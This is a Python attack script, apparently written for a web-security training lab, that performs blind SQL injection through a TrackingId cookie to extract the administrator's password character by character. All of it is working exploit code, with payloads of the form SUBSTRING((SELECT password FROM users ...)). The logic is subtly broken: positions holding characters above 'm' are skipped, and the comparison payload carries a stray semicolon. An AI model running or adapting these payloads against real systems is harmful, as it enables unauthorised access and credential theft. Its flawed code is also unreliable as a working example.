import requests
import argparse

parser = argparse.ArgumentParser(description="A tool built for Blind SQL payload bruteforcing. This tool is specifically built for Lab 11: Blind SQL injection with conditional responses'.")

parser.add_argument("-t", "--trackingid", type=str, required=True, help="The tracking ID")
parser.add_argument("-u", "--url", type=str, required=True, help="The lab URL")

args = parser.parse_args()

url = args.url
trackingid = args.trackingid

alphanum = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
string = ''
e = 1

while e < 21:
    headers = {'cookie': f"TrackingId={trackingid}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {e}, 1) > 'm'; session=8ysbazh0hcfsevbw5c50k7qidcmlppst:"}
    response = requests.get(url, headers=headers)

    if 'Welcome' not in response.text:
        for i in alphanum:
            headers = {'cookie': f"TrackingId={trackingid}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {e}, 1) = '{i};"}
            print(f"[{e}/20]" + "\t\033[32m" + string + "\033[0m" + "\033[91m" + i + "\033[0m", end='\r', flush=True)
            r = requests.get(url, headers=headers)
            if 'Welcome' in r.text:
                string+=i
                print(f"[{e}/20]" + "\t\033[32m" + string + "\033[0m")
                break
    e+=1
